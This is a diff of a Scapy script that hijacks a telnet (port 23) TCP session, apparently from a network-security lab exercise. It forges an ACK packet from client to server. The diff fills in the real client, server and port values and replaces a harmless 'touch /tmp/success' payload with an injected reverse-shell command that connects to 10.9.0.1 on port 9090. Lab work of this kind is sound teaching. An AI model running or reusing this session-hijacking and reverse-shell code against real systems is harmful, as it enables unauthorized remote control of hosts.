@@ -13,12 +13,12 @@ def spoof(pkt):
     newack = old_tcp.seq + tcp_len - 20
 
     #############################################################
-    ip = IP(src="*.*.*.*", dst="*.*.*.*")
+    ip = IP(src=cli, dst=srv)
 
-    tcp = TCP(sport=old_tcp.dport, dport="**", flags="A", seq=newseq, ack=newack)
+    tcp = TCP(sport=old_tcp.dport, dport=23, flags="A", seq=newseq, ack=newack)
 
-    data = "\ntouch /tmp/success\n"
-    # data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
+    # data = "\ntouch /tmp/success\n"
+    data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
     #############################################################
 
     pkt = ip / tcp / data
@@ -36,4 +36,4 @@ print("Filter used: {}".format(myFilter))
 print("Spoofing TCP packets from Client ({}) to Server ({})".format(cli, srv))
 
 # Change the iface field with the actual name on your container
-sniff(iface="br-07950545de5e", filter=myFilter, prn=spoof)
+sniff(iface="br-08cf94f2500e", filter=myFilter, prn=spoof)
